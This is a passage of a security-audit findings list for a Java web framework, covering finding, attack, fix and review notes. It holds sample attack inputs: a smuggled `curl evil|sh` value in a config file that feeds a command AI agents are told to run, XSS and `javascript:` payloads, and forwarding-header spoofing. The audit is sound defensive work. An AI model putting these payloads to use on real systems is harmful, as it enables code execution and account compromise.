    `start()` re-validates; a previous-secrets list without the bound (copied) honours no
    previous-secret cookie. The bound still rides on the `PreviousSecrets` list type, with a
    TODO, because `BraceHandler.java` could not change.
  - **Follow-up** (`refactor(security): M7 pass the previous-secret lifetime bound explicitly`).
    `Session.fromCookie(cookie, secret, previousSecrets, maxPreviousAbsoluteSeconds)` takes the
    bound as a required argument (no overload accepts previous secrets without it; a bound that is
    not positive honours no previous-secret cookie). `BraceHandler.decodeSession`, shared with the
    WebSocket upgrade, passes `SessionOptions.maxPreviousAbsoluteSeconds()`. The `PreviousSecrets`
    list subclass and the TODOs are gone; `SessionOptions.previousSecrets()` is a plain list.

- [x] **M8: Buffered `Http.fetch*` has no timeout on the response body**, `Http.java:197, 224-230, 253-261, 315-329`
  - **What's wrong.** `fetch()`, `fetchString()`, `fetchJson()`, `fetchBytes()` and the
    error-body path of `fetchEvents` send with `BodyHandlers.ofInputStream()` and loop on
    `body.read(buffer)` in `readBody`. `HttpRequest.timeout` covers only the wait for headers;
    the class's own comments say so. The `Watchdog` is attached only in `stream()`.
  - **Verified (JDK 21.0.10).** With a 2 s request timeout and a server that sends headers plus
    3 bytes and then stalls, the body read was still blocked after 8 s.
  - **Attack.** Any feature that fetches a user-supplied URL (webhook test, link preview, avatar
    import). The attacker's server answers headers at once, then sends nothing, or 1 byte every
    29 s under the 10 MB cap. Each request holds a handler thread, and its pooled connection in
    a `DbHandler`, indefinitely; a few dozen exhaust the pool. Not documented as a tradeoff.
  - **Fix.** Run `readBody` through the existing `Watchdog`/`WatchedInputStream`: an idle
    timeout (30 s default) and a total deadline for buffered fetches. Document it next to the
    size cap in `docs/SECURITY.md`.
  - **Tests.** A stalling body fails within the idle timeout; a slow-drip body fails at the
    total deadline; a normal large body is unaffected.
  - **Model: Opus 5.5.** Watchdog concurrency.
  - **Review fixes** (`fix(security): M8 review fixes`). `timeout(null)` means the 30s default
    for buffered calls (only `stream()` may run without a deadline); zero or negative throws;
    durations over 365 days are clamped instead of overflowing.

- [x] **M9: STARTTLS is opportunistic**, `Mailer.java:134, 182-186`
  - **What's wrong.** For `smtp://` the mailer sets `mail.smtp.starttls.enable` but never
    `mail.smtp.starttls.required`. With `enable` only, Angus Mail continues in cleartext when
    the server's EHLO does not advertise STARTTLS, then sends AUTH and the message. This moves
    the 2026-10 "Not confirmed" Mailer item to confirmed in code; the fallback is the library's
    documented default and was not exercised.
  - **Attack.** A network attacker between the app and an `smtp://user:pass@relay:587` relay
    removes `250-STARTTLS` from the EHLO reply and reads the SMTP password and every mail body,
    including password-reset links.
  - **Fix.** Decision D4 in the fix plan, decided: `mail.smtp.starttls.required=true` for
    `smtp://`, with an explicit opt-out for a local relay (a `smtp+plain://` scheme or a
    builder flag).
  - **Tests.** The session properties for each scheme; the opt-out.
  - **Model: Sonnet 5.5.**
  - **Review fixes** (`fix(security): M9 review fixes`). Credentials on an `smtp+plain://` URL
    log one warning at construction (never the credentials); the scheme is compared
    case-insensitively, so `SMTPS://` is implicit TLS.

## Low

- [x] **L1: An unrecognized `scope:` value silently becomes CONTROL**, `OpsKeys.java:121-134`, `OpsScope.java:34-41`
  - `OpsScope.parse(value, CONTROL)` falls back to CONTROL for anything it doesn't know, and a
    line with no `scope:` token is CONTROL. Probed: `scope:readonly`, `scope: read` (space),
    `Scope:read`, `read-only`, and a key listed twice (last wins) all yield CONTROL, with no log.
  - **Attack.** An operator hand-writes `KEY scope:read-only ci-agent`; the agent's key mints
    CONTROL tokens.
  - **Fix.** Decision D6. Fail startup on an unrecognized `scope:` value or a scope-like token
    in another case; on a duplicate key keep the lower scope or refuse; log each key's
    fingerprint and scope at boot.
  - **Model: Sonnet 5.5.**
  - **Review fixes** (`fix(security): L1 review fixes`). Grammar rewritten: any token with `:`
    or `=` must be exactly `scope:read`/`scope:control`, at most once; other tokens are labels,
    except a lone scope word after the key; `#` after whitespace is a comment; a leading BOM is
    stripped. A token with no scope claim is READ. Tests for unknown/missing token scope and an
    unknown requested scope on `/ops/auth`.
  - **Follow-up** (`fix(security): L1 brace ops keypair rejects labels the keys file would
    refuse`). `brace ops keypair --label` wrote the label unvalidated, so `--label read` (no
    `--read-only`), `a:b`, `k=v` or a label starting with `#` produced a line that stopped the
    server or lost the label to a comment. `CliOps.labelProblem` refuses those (and control
    characters) with a message naming the rule, before any key is generated; Unicode spaces are
    collapsed like ASCII ones (a `#` after one starts a comment); the default label replaces
    `:`/`=` and drops a leading `#`. `CliOpsTest` round-trips a table of labels through
    `OpsKeys.loadAuthorizedKeys` at both scopes, including a same-label rotation.
    - **Final review fixes.** L-A: scope words written as labels still loaded as CONTROL
      (`KEY read ci-agent`, `KEY ci-agent read-only`, `KEY (read)`, `KEY scope：read`,
      `KEY label #1 scope:read`), because the rule refused a bare scope word only when it was
      the sole token. The scope token is now mandatory: a key line without `scope:read` or
      `scope:control` fails startup with the line number and what to add (`scope:control` keeps
      the old meaning). Breaking for every existing file with an unscoped line. Also refused: a
      scope inside a key line's comment, non-ASCII whitespace, a mid-file BOM, invisible
      format characters, look-alikes of `:` and `=`, and a key token that is not a 44-byte
      Ed25519 public key (OpenSSH lines get their own message). `brace ops keypair` and the
      scaffold always write the token; a scope word is accepted as a label at either scope.
      Tests in `OpsKeysFinalReviewTest`, `CliOpsTest`; every fixture now writes `scope:control`.

- [x] **L2: Ops origin pinning is required only when `brace.mode` is exactly `prod`**, `Brace.java:1243-1246`, `OpsHandler.java:1021-1031`
  - With the mode unset, startup succeeds unpinned and `originIsThisServer` falls back to
    comparing the signed host with `req.host()`, which the `opsOrigins` Javadoc calls "no
    defense". `validateSecret` already refuses "everywhere except dev" because old scaffold
    Dockerfiles launch with no mode.
  - **Attack.** On a mode-less deployment, a PR changes `ops.prod.url` to an attacker origin;
    the CLI signs that origin; the attacker relays the body to the real app with a matching
    `Host` header and receives a bearer token at the key's ceiling.
  - **Fix.** Decision D6. Require `opsOrigins` unless the mode is `dev` or the test harness.
  - **Model: Sonnet 5.5.**

- [x] **L3: `req.ip()` prefers client-sent `X-Forwarded-For` over the proxy's `Forwarded`; repeated header lines are last-wins**, `Request.java:493-507`, `BraceHandler.java:283-286`, `Brace.java:1369`
  - `X-Forwarded-For` is checked first and `Forwarded` only when it is absent. The comment says
    Jetty joins repeated headers with ", "; the header map is built with `put`, so the last
    line wins.
  - **Verified (scratch server).** `X-Forwarded-For: 6.6.6.6` plus `Forwarded: for=203.0.113.9`
    gives `ip=6.6.6.6`; two XFF lines give the second.
  - **Attack.** Behind a proxy that sets only RFC 7239 `Forwarded` and passes XFF through, a
    client chooses its own IP for per-IP limits, IP allowlists and audit logs.
  - **Fix.** Make the forwarding header an explicit choice on `TrustedProxies` (default XFF
    only) and ignore the other; build the list from all field instances, in order.
  - **Model: Opus 5.5.**
  - **Review fixes.** F3: a trusted peer that sends only the unchosen forwarding header now gets
    one warning naming `useForwardedHeader()` (both directions). F8: `Forwarded` is split
    respecting quoted-strings and escapes, and a selected entry that is not an IP literal
    (`<script>`, `"a,b"`, `_hidden`, `unknown`) yields the socket address: `req.ip()` is only ever
    a literal or `unknown`. F9: `X-Forwarded-Proto`/`Host` take the rightmost entry across all
    lines (one header-map builder joins them for HTTP and WebSocket); the docs say the proxy must
    overwrite them. F10: `Cookie` lines are joined with `"; "` on both paths and the WebSocket
    upgrade parses the session cookie as HTTP does (first occurrence of a name wins). Tests in
    `ProxyHeadersReviewFixesTest`.
    - **Final review fixes.** M-A (regression from F8): a client's unbalanced quote
      (`Forwarded: for="x`) swallowed the appending proxy's element, the selected value was not
      an address, and the fallback returned the socket peer, the trusted proxy. `Forwarded`
      elements are now split from the right, so a proxy's element is delimited by its own text,
      and a trusted proxy's header that names no usable client yields `unknown`, never the
      proxy's address (both header modes; a trusted peer sending no forwarding header at all is
      still itself). `X-Forwarded-Host` must be a `host[:port]` or it is ignored. `req.ip()` is
      canonical (RFC 5952, IPv4-mapped as IPv4, zone kept). Tests in
      `ProxyHeadersFinalReviewTest`.

- [x] **L4: The page cache stores any status and keys on the raw path**, `Cache.java:398-406, 424-433`, `InMemoryBackend.java:53-63`, `PostgresBackend.java`
  - `RenderedResponse.from(result)` is stored regardless of status. The key ignores undeclared
    query params and headers, but the handler still receives them. The key uses the undecoded
    `request.path()`, so `/posts/hello` and `/posts/hell%6f` are separate entries for one page.
  - **Verified (scratch server).** `GET /cached?fail=1` on a cold entry, then two plain
    `GET /cached` both returned the cached 400.
  - **Attack.** One request pins an error, redirect or htmx fragment for every visitor for the
    TTL. Encoded path variants mint unlimited entries: the in-memory backend evicts the app's
    own entries at its 10,000 cap; the Postgres backend has no cap.
  - **Fix.** Cache only 2xx; key on the route pattern plus decoded path parameters; give
    `PostgresBackend` a row cap.
  - **Model: Opus 5.5.**
  - **Review fixes.** F5: the row cap covered the whole table, so a page flood evicted the app's
    own entries (reviewer: 0 of 50 survived). Page keys now carry `brace:page:`; Postgres caps
    page rows separately (default 10,000) and trims them first under the overall cap; in memory
    page entries are evicted first and a new page never displaces an app entry (50 of 50
    survive). F6: a declared `vary` param keys on all its values; `Authorization`, `HX-Target`,
    `HX-Trigger`, `HX-Trigger-Name`, `HX-Boosted` and `HX-Prompt` bypass the cache unless declared
    with the new `varyHeader(...)`; in dev mode and `Brace.test()` the handler's reads through
    `Request` are recorded and an undeclared query param, header, cookie, `ip()` or body read is
    logged once per route (dev) or thrown (test); a response that sets a cookie is returned
    intact and not stored. Tests in `PageCacheReviewFixesTest`, `PageCacheCapPostgresIT`.
  - **Final review fixes** (`fix(security): L4 final review fixes`). Tests in
    `PageCacheFinalReviewTest`, `PageCacheCapPostgresIT`.
    - `HX-Request` other than exactly `true` stored a `hasHeader`-based partial under the
      full-page key: it is keyed as absent / `true`, and any other value bypasses the cache, so
      every read of the header is fixed by the key and the detector's excuse for it is sound.
    - A `HEAD` miss stored its (possibly empty) body for `GET`: a `HEAD` may be served a `GET`
      entry but never stores. A raw path not in RFC 3986 normal form (`/p/%62` for `/p/b`) never
      stores either, since `req.path()` is an unrecorded raw read. Flagging `req.path()` reads in
      the detector needs a hook in `Request.java` (outside this fix's files); not done.
    - In memory, a flood of twice the page cap locked the real pages out (they hit 3%): pages are
      now evicted by CLOCK (approximate LRU), a new page always displaces a cold page (never an
      app entry), and a store full of app entries no longer costs two scans per page request
      (inline expiry sweeps at most once a second; O(1) refusal with no page to displace).
    - On Postgres, page rows were trimmed soonest-expiring first (600 of 600 requests ran the
      handler in the reviewer's 1d/5m scenario): new migration `V19__brace_cache_used_at.sql`
      adds `used_at` (write time, refreshed on a hit at most once a minute per row), and page rows
      are trimmed least recently used first.
    - `varyHeader` values are SHA-256 hex in the key (`Authorization` was stored in clear in
      `brace_cache.cache_key`).
    - App `set`/`getOrSet`/`delete` on `brace:page:` throw `IllegalArgumentException`
      (`deletePrefix("brace:page:")`, tags and `clear()` still clear pages); `deletePrefix(null)`
      throws `IllegalArgumentException`.
    - **Verification fixes.** The in-memory page clock (a regression from the CLOCK fix): a
      `clear()` (`/ops/cache/clear`) during a page flood, or `clearTag`/`deletePrefix` mixed into
      page traffic, left up to 997 of 1,000 pages off the clock, unevictable until their TTL, and
      app entries were then evicted in their place. One `ReentrantLock` now guards the clock, the
      page count and every insert or removal of a page key in the store (one remove path for
      `clear`, tags, prefixes, expiry and deletes); eviction and compaction are mutually
      exclusive; the hand rebuilds from the store if it ever finds pages counted but none on the
      clock. App entries never take the lock. Tests in `PageClockConsistencyTest`.
      `Paged` links (a regression from the raw-path check): `linkedTo` read `req.path()`, so the
      documented `cache.wrap(...).vary("page")` example answered 500 under `Brace.test()`, and it
      copied every query pair, so `?page=2&ref=evil.example` stored `ref=` in links later served
      for `?page=2`. Links now read the path without recording it, and inside a page-cached
      handler (the cache marks the request in every mode) copy only the declared `vary` params.
      Tests in `PagedPageCacheTest`.

- [x] **L5: A NUL or oversized value in a rate-limit or cache key breaks the Postgres path**, `RateLimiter.java:234-251, 393-430`, `Counters.java:118-147`, `Cache.java:441-451`, `PostgresBackend.java:47-83`
  - Rate-limit keys of 64 characters or fewer are used raw. `username=a%00` yields a key with a
    NUL; the multi-row counter statement is rejected, every delta is restored, and the poison
    key keeps each flush failing until its window rolls. Each instance then counts only its own
    traffic, so the fleet limit becomes limit × instances.
  - A `vary()` value with a NUL makes the cache `SELECT` throw: a 500 and a new error kind on
    demand. A roughly 3 KB incompressible value should exceed the btree row limit on insert
    (not executed).
  - **Fix.** Hash any key containing a control character (both classes); hash cache keys over
    about 512 bytes; on a failed counter batch, retry per key and discard the one that fails.
  - **Model: Opus 5.5.** Same Postgres-IT caveat as M5.
  - **Review fixes.** F7: `deletePrefix("search:#sha256:")` and `deletePrefix("search:\u0001")`
    deleted `search:alpha`. A prefix that had to be cut now deletes plain keys starting with the
    whole prefix plus hashed keys whose readable part is exactly the cut prefix; the Javadoc
    states the over-deletion that remains. F11: a rate-limit or cache key with an unpaired
    surrogate is hashed (from 0xFF plus its UTF-16 units, so lone surrogates stay distinct);
    pgjdbc had sent them as `?`. Tests in `CacheKeyReviewFixesTest`,
    `CacheKeyReviewFixesPostgresIT`.

- [x] **L6: Rate-limiter state has no cap on distinct keys; `perIp` buckets full IPv6 addresses**, `RateLimiter.java:82, 96-98, 116-121, 256, 311-313`
  - Each distinct key holds map entries and a `brace_counters` row for the whole window. A
    client with a routed IPv6 /64 rotates source addresses and never trips `perIp`.
  - **Fix.** Key IPv6 on its /64; cap distinct keys per limiter and fold the excess into one
    overflow bucket.
  - **Model: Opus 5.5.**
  - **Review fixes.** F1 (regression): Jetty reports an IPv6 peer as `[0:0:0:0:0:0:0:1]` and the
    strict literal parser refused the brackets, so no IPv6 proxy was trusted and direct IPv6
    clients were not grouped by /64; the peer address is now unbracketed where it enters the
    framework (HTTP and WebSocket) and `parseLiteral` accepts one bracket pair. Decision B: at the
    cap a new key evicts the least recently used under-limit key of a bounded sample (blocked keys
    stay pinned; evicted rows are deleted on Postgres), then falls back to a per-IP overflow
    bucket, then the global one. F4: counter statements are chunked at 5,000 rows, a refused chunk
    is bisected, the parameter-count error is not a key problem, and a flush stops after 2 s.
    F12: documented why same-label limiters share buckets only in shared mode. Tests in
    `Ipv6PeerSocketTest`, `RateLimiterReviewFixesTest`, `RateLimiterFlushPostgresIT`.
    - **Final review fixes.** The shared-mode eviction was rebuilt: everything an instance knows
      about a key is one object in one table, so no second map can hold orphans (M-C:
      `lastKnownGlobal` grew without bound under concurrency). M-B: an eviction never deletes a
      `brace_counters` row (an instance with a stale view released a key the fleet had blocked);
      an evicted key's buffered count is still flushed, and a key that returns has its fleet
      count read on its first check (a Bloom filter of evicted keys decides which new keys pay
      that round trip). L-F: the flush trigger is a count of requests buffered since the last
      flush, never decremented by eviction, so it cannot go negative or stall. L-G: every flush
      statement carries a JDBC query timeout for the rest of the 2 s budget. L-H: recency is a
      per-limiter sequence, and a key counted since the last flush is evicted last. M-D: per-address
      overflow buckets are evictable and bounded by `maxKeys` (not `maxKeys / 10`), and what a
      saturated limiter does is a named option, `onSaturation(FAIL_CLOSED | FAIL_OPEN)`, default
      fail closed, with the attack cost of each documented. The dev warning redacts the path.
      Tests in `RateLimiterFinalReviewTest`, `RateLimiterFlushPostgresIT`. Residual, documented:
      with per-process counting an evicted key restarts from zero; `brace_counters` rows are
      bounded by time (one per key per window), not by the cap; a wait for a pooled connection
      is not covered by the flush budget.

- [x] **L7: Smaller gaps in template output**, `BraceHtmlOutput.java:87-88, 190-194, 226-229, 318-335, 367-370, 432-435`
  - **Template-written `javascript:` URL.** `<a href="javascript:go('${x}')">` with
    `x=');alert(1);//` renders `&#39;);alert(1);//`, which the browser decodes and runs on
    click. Fix: when the template's scheme is `javascript` or `vbscript`, block the value or
    script-escape the user parts.
  - **`hx-vals`/`hx-headers` `js:` guard.** htmx trims with JavaScript `trim()`, which strips
    U+00A0 and U+FEFF; `normalize` strips only characters up to space. A value starting with
    NBSP then `js:{…}` is emitted and evaluated. The guard also runs only when the value is
    exactly one interpolation: `hx-vals=' ${x}'` and `hx-vals='${a}${b}'` pass `js:` through.
    Fix: apply the test to the whole held value after stripping Unicode whitespace.
  - **Split scheme without a hold.** `<a title="x a = 'b" href="${x}://${y}">` with
    `x=javascript`, `y=%0aalert(1)` renders `javascript://%0aalert(1)`: the regex opens a bogus
    hold on the earlier attribute, and each piece is then judged alone. Fix: choose the last
    `name=quote` candidate, or accumulate from the first user piece to the closing quote.
  - **Entity-encoded static prefix.** `href="&#32;${x}"` with `x=javascript:alert(1)` passes,
    because `#` counts as "scheme settled by the template". Fix: decode character references
    in the static prefix, or treat a prefix containing `&` as not settling the scheme.
  - **Mixed-case `<Script>`.** JTE compares `"script".equals(tagName)`.
    `<Script>foo('${x}')</Script>` renders `foo('');alert(1);//')`. Fix: lower-case the tag
    name before `super.setContext`.
  - **`<style>` bodies and `style=""`.** Only HTML-escaped, so a value can close the rule and
    add selectors that exfiltrate a CSRF field under a CSP that allows inline styles. Fix:
    restrict user data to a safe character set there, or document it as not covered.
  - **Docs.** `docs/SECURITY.md:348-354` overstates `hx-trigger`: `click[alert(1)]` passes
    unchanged, since the escaping only protects data inside a quoted JavaScript string. The
    same file still lists `@template` inside an attribute as not covered; it now is.
  - **Model: Fable 5.2.** Same class and invariants as H1; one commit per item.
  - **Review fixes.** From the same independent review as H1's (F1, F2, F3 and F5 are listed
    there):
    - **F4** (`afabcb0`, low). `hx-request` takes the same `js:`/`javascript:` prefix as
      `hx-vals` (htmx reads both through one function) and was script-escaped but not held:
      `hx-request='${x}'` with `x=js:x:alert(1)` was emitted unchanged. It is now held and
      judged whole like `hx-vals` and `hx-headers`. Audit of the bundled htmx 2.0.10: that
      function's callers are `hx-vals`, `hx-headers`, `hx-request` (prefix, now all guarded)
      and `hx-vars` (always evaluated, so script-escaped only, as documented); the other
      evaluating attributes are `hx-on*` and `hx-trigger` filters, also as documented.
  - **Final review fixes.** From the final whole-branch review (M1, L1 and L3 are under H1):
    - **L2** (`9febd05`, low). During a tokenizer desync no value is held, and `hx-vals` was
      judged one `${...}` at a time: `hx-vals='${x}${y}'` with `j` and `s:alert(1)` rendered
      `js:alert(1)`. When JTE reports `hx-vals`, `hx-headers` or `hx-request` and the tokenizer
      is not in that value, none of the data is written: `{}` for the first non-empty piece,
      nothing for the rest, until template text with a quote in it. URL attributes in the same
      situation were already blocked piece by piece (pinned in the corpus).

- [x] **L8: `csrf-htmx.js` attaches the token to every non-GET htmx request with no origin check**, `src/main/resources/brace/csrf-htmx.js:3-7`
  - Safe only while htmx's `selfRequestsOnly:true` default holds. An app that turns it off for
    a cross-origin `hx-post` sends the token to the third party.
  - **Fix.** Add the header only when
    `new URL(event.detail.path, location.href).origin === location.origin`.
  - **Model: Haiku 5.5.**
  - **Final review fixes** (`33fd77d`, nit). The path was read when the listener ran, so an app
    listener registered later that rewrote it to another origin was not rechecked. htmx has no
    later hook that can remove a header, so the header is defined with a getter that htmx reads
    when it copies the headers onto the request, after every `htmx:configRequest` listener.

- [x] **L9: Literal `.` and `..` reach handlers as path-parameter values**, `BraceHandler.java:243-244`, `Route.java:52`
  - **Verified (scratch server).** `GET /items/../y` on `/items/{a}/{b}` gives `a=..`. A handler
    resolving a path from parameters serves a sibling directory, and a proxy that normalizes
    dot segments for its own ACLs but forwards the raw URI sees a different path than Brace.
  - **Fix.** Return 404 when any raw segment is exactly `.` or `..`.
  - **Model: Sonnet 5.5.**
  - **Review fixes.** Two gaps, tests in `DotSegmentReviewFixesTest`.
    - The WebSocket upgrade path was not covered: Jetty matches the upgrade against the
      canonical path, so `/ws/../ws`, `/files/../ws`, `/%77s` and `/ws;x` returned 101 (with
      the route's access still enforced). The upgrade is now declined with 404 unless the raw
      request path equals the registered path exactly.
    - The dot-segment 404 was thrown before the `Request` existed, so it skipped
      after-middleware and went out without the app's security headers. It is now answered
      after the request is built, with no route or mapping matched for it.
    - **Final review fixes.** None of its own; the dot-segment 404 under a guarded static
      mapping is now `no-store` (see M3).

- [x] **L10: A `Route` whose access was never resolved is open, not closed**, `Route.java:27`, `BraceHandler.java:117-194, 351-352`
  - `access` starts as `List.of()`, and only `Brace.resolveAccess()` fills it. `BraceHandler` is
    public with public constructors, so a handler built without `Brace.start()` serves every
    route with no requirement.
  - **Fix.** Initialise to null and have `Route.access()` throw when unresolved.
  - **Model: Sonnet 5.5.**
  - **Review fixes.** `Brace.stop()` unfroze the router before Jetty had stopped, so a route
    registered during shutdown was matched by requests still draining (answered 500, since its
    access was unresolved) while the `Router`'s unsynchronised collections were mutated under
    them. The router is now unfrozen only after `server.stop()` returns. Verified by reading;
    reconfiguring a stopped app is still covered by `RouteAccessTest`.
    - **Final review fixes** (`fix: Brace lifecycle is a single guarded state`). L-D: an app with
      `.ops(...)` could not be restarted, or retried after a failed start (`POST /ops/auth is
      registered twice`): `stop()` now removes the framework's routes. L-E: `stop()` racing
      `start()` left a running server with an unfrozen router that no later `stop()` stopped,
      and a second `start()` leaked the first server. `start()` and `stop()` now run under one
      lock over an explicit state (new, starting, running, stopping, stopped): `start()` on a
      starting or running app throws, a failed start tears down and leaves the app startable,
      and `stop()` is idempotent and waits out a concurrent `start()`. Tests in
      `BraceRestartTest`.
    - **Verification fixes** (`fix: Brace restart with a database either works or says why`).
      Restarting an app with a database failed inside `JobScheduler` (`RejectedExecutionException`
      with `ownsDatabase(false)`, `EntityManagerFactory is closed` with a fresh factory). Rebinding
      every component (owned pool, per-start framework jobs, a shared cache backend's factory) is
      a larger change, so a second `start()` of an app started with a database now throws a clear
      `IllegalStateException` up front; build a new `Brace`. Apps without a database still restart,
      and the scheduler drops its terminated executor on `stop()`, so a job registered while
      stopped runs after the next `start()`. Tests in `BraceRestartTest`.

- [x] **L11: The CLI on a hostile checkout**, `CliConfig.java:38-42`, `CliCheck.java:259-261, 328, 436, 441`, `CliCommands.java` (render paths), `CliAuth.java:28`, `CliAgentsMd.java:58, 62`, `CliInit.java:20-21, 34-35, 62`, `CliOps.java:70-73`
  - **`followUp` injection.** `ops.env` from the committed `.brace` is spliced unvalidated into
    the `followUp` command that `docs/agent-ops-guide.md` tells agents to run:
    `ops.env=x;curl evil|sh;` yields `"followUp":"brace errors --env x;curl evil|sh; --json"`.
    Fix: validate env names against `[A-Za-z0-9_-]{1,32}` in `CliConfig.load`.
  - **Control characters in human output.** Server strings are printed raw, so a server named
    by a hostile `.brace` can erase the launcher's "pins older" note and the "ops.url is now …"
    warning, or send OSC sequences. Fix: one `CliOutput.sanitize()` applied to every rendered
    string. JSON mode is already safe.
  - **Writes through committed symlinks.** `brace agents-md`, `brace init` and
    `brace ops keypair` use plain `Files.writeString` or `!Files.exists` checks, so
    `BRACE-AGENTS.md -> ~/.ssh/authorized_keys` is overwritten with the reference doc. Fix: one
    helper that refuses a symlink target or writes by temp file and move, as `SecretFiles` does.
  - **Model: Sonnet 5.5.** Three commits.
  - **Final review fixes** (`fix(security): L11 final review fixes: ...`, four commits plus
    `fix(cli)` nits). The CLI had no request timeout or body cap (one shared client, 30 s
    request deadline, 16 MB cap, `CliHttp`; `ops.key` must be a regular file under 64 KB);
    `--json` passed C1 controls, bidi, format and line-separator characters raw (now escaped as
    `\uXXXX`, keys included); `brace ops keypair --label` missed an old entry whose scope token
    was not second or that had a trailing comment, leaving its key trusted (now parsed with the
    server's rules; the three rules are duplicated from `OpsKeys` and should be shared);
    server text in error messages is cut to 300 characters. Nits: non-integer `statusCodes`
    keys in `brace check`, trailing-slash ops URLs, an `Error` exits 1 with a short message.
    Docs: `maxUploadSize("10MB")` now parses, `SessionOptions.secure(config.get(...))` sample,
    the README's missing-key rate-limit bucket is per client IP.

- [x] **L12: `WebhookNotifier` posts exception text as Slack markup, unbounded**, `WebhookNotifier.java:29-34`
  - The message is redacted but otherwise raw; Slack and Mattermost parse `<!channel>` and
    `<https://evil|View incident>`. A web user who triggers a new error kind with input in the
    message can phish or spam the ops channel.
  - **Fix.** Escape `&`, `<`, `>` and truncate to about 500 characters.
  - **Model: Sonnet 5.5.**
  - **Review fixes** (`fix(security): L12 review fixes`). Mattermost markdown (`@channel`,
    `[text](url)`, `![](pixel)`) passed unchanged. Each field is now one inline code span with
    backticks, `< > &` and `@` replaced by look-alikes and control characters by spaces;
    truncation happens first and never splits a surrogate pair.

- [x] **L13: Raw exception messages still reach `/ops` without `redactMessage`**, `JobScheduler.java:199`, `OpsHandler.java:465`, `Brace.java:1449-1452`, plus `Log.warn("…" + e.getMessage())` sites (`Mailer.java:81`, `WebhookNotifier.java:42`, `RateLimiter.java:215, 380`, `JobScheduler.java:279, 330`)
  - Scheduled-job `lastError` is served at `/ops/status`; the uncaught-exception event reaches
    `/ops/logs`. `redactMessage` also does not recognize the ops token's own two-part shape.
  - **Fix.** Apply `redactMessage` at those sinks (or inside `Log.warn`/`Log.event` for string
    values), and add a two-part base64url shape to `isSecretShaped`.
  - Done in Track D: `redactMessage` applied at `JobScheduler` `lastError` and warn sites, the
    uncaught-exception event and stats record in `Brace.java`, `Mailer`, `MailerNotifier`,
    `WebhookNotifier`, `RateLimiter` (one-line wraps), `RegressionTracker`, `TrustedProxies`.
    The two-part base64url token shape in `isSecretShaped` is done under M6 (`Redactor.java`):
    one dot, at least 20 base64url characters on each side, a digit and a letter, so an ops
    bearer token in an exception message, header or query value is now `[redacted]`.
  - **Model: Sonnet 5.5.**
  - **Review fixes** (`fix(security): L13 review fixes`). Also wrapped: `PostgresMessageBus` log
    events, `Storage` `s3.delete.error` (now null-safe), `JobPoller`'s stored
    `scheduled_jobs.error` and its `System.err` lines. Left raw on purpose: CLI-side terminal
    output (`Cli*.java`, `ProjectGenerator`, `ClaudeMdGenerator`), messages of exceptions thrown
    to the caller rather than written to a sink (`Http.failed`, `EventStream`, `Request`), and
    `BraceHandler`'s `stats.recordError`, which `Stats` already redacts.
  - **Final review fixes** (`fix(security): L13 final review fixes`). Wrapped in
    `Redactor.redactMessage`: `Analytics` flush-failure warning and `analytics.observe_failed`
    debug event, `WsRegistry` `ws-broadcast-send-failed`, `PostgresBackend` cache-trim debug
    line. Still raw, in files owned by other fixes, to wrap after the merge: `BraceHandler`
    after-middleware warning, request-resource release warning and upload temp sweep warning
    (`"…" + e`), `Request` upload temp-file release warning; and on stderr only,
    `Brace` shutdown error and `HealthCheck` failure.

- [x] **L14: `@Email` plus `Mailer.to` accepts recipient lists**, `FormBinder.java:246-252`, `Mailer.java:148-152`
  - **Verified (angus-mail 2.0.5).** `"a@b.c, victim@x.y"` passes `@Email` and parses to two
    recipients. Confirms the 2026-10 "Not confirmed" item.
  - **Fix.** `@Email` rejects `,`, `;`, `<`, `>`, whitespace and control characters; the
    single-recipient API uses `new InternetAddress(to, true)`.
  - **Model: Sonnet 5.5.**
  - **Review fixes** (`fix(security): L14 review fixes`). `MailerNotifier` with a
    comma-separated list had broken (every notification threw in its thread); it now takes one
    or more recipients, validates each at construction and sends one message per recipient. The
    blunt `,`/`;` check is gone (a quoted display name with a comma is one address); groups,
    route addresses and control characters are refused. `cc`, `from` and `replyTo` are strict
    single addresses too (`replyTo` is now applied as `Reply-To`).
  - **Final review fixes** (`fix(security): L14 final review fixes`). `@Email` accepted RFC 822
    comments, which became a display name on the wire: `evil@attacker.tld(ceo@corp.example)` was
    sent as `"ceo@corp.example" <evil@attacker.tld>`. `@Email` now refuses `(`, `)` and `"`, and
    the value must parse strictly as one address with no personal part whose address equals the
    value. Test: `FormTest.emailRejectsCommentsThatBecomeADisplayName`.

- [x] **L15: `QueryTaint` evasions; the cache class allow-check covers only `getOrSet`**, `Sort.java:73-89`, `Database.java:690, 702`, `QueryTaint.java:95-100, 143`, `Cache.java:294, 308`
  - `Sort.of` normalizes its input, so `secretField%20`, `secretField desc` and
    `secretField,id` no longer appear verbatim and nothing fires. Recording stops after 1,000
    values or 64 KB in path, query, form order, so a padded query string leaves the form
    unchecked. Detection only; production merely logs.
  - `cache.get(key, type)` accepts any stored class assignable to `type`, so with `Object` or an
    interface a writer to `brace_cache` still chooses the class Jackson binds.
  - **Fix.** `Sort.of` keeps and checks the original string; check form values first or log
    "unchecked, over cap"; apply `STORED_CLASSES` on both cache paths.
  - **Model: Sonnet 5.5.** Deferrable.
  - **Final review fixes** (`fix(security): L15 final review fixes`).
    - **QueryTaint.** The per-source cap was evaded by padding within one source:
      `GET /q?` + `a=abc&` × 1000 + `sort=body` ran `ORDER BY body` with 200 under `Brace.test()`,
      and production logged nothing. Path and query values now have no count cap (the request
      line is bounded at 8 KB; a 64 KB character cap only bounds a hand-built `Request`); the form
      body keeps 1,000 values / 1 MB. An over-cap request that reaches a where-fragment, raw query
      or `Sort.of` now throws in dev mode and `Brace.test()`, and production logs once a minute per
      call site. Tests: `QueryTaintTest.paddingTheQueryStringNoLongerHidesASortValue`,
      `queryAndPathValuesHaveNoCountCap`, `anOverCapRequestThrowsInStrictModeWhenItReachesAQuery`,
      `productionLogsOverCapOncePerCallSite`.
    - **Cache class allow-check (M2).** `get(key, SuperType.class)` missed on any instance that
      had not itself stored the concrete class (an `ArrayList` read as `List`, a `HashMap` as
      `Map`, `Integer` as `Number`), with only a debug line: after a deploy a denylist read
      through its interface failed open, and `getOrSet` on a fresh instance recomputed and
      overwrote the shared value. Now a built-in allowlist of JDK containers and values
      (`Cache.BUILT_IN_VALUE_CLASSES`, arrays included) is always accepted as the stored class,
      app classes are registered with `cache.allowType(...)` (concrete classes only), the exact
      requested type is always read, and a refused read logs a WARN once per (stored class,
      requested type) naming `allowType`. A planted foreign class through `Object` still misses.
      Elements inside a container still come back as Jackson's natural types (unchanged). Tests
      in `CacheSerializationTest` (two `Cache` instances over one backend).

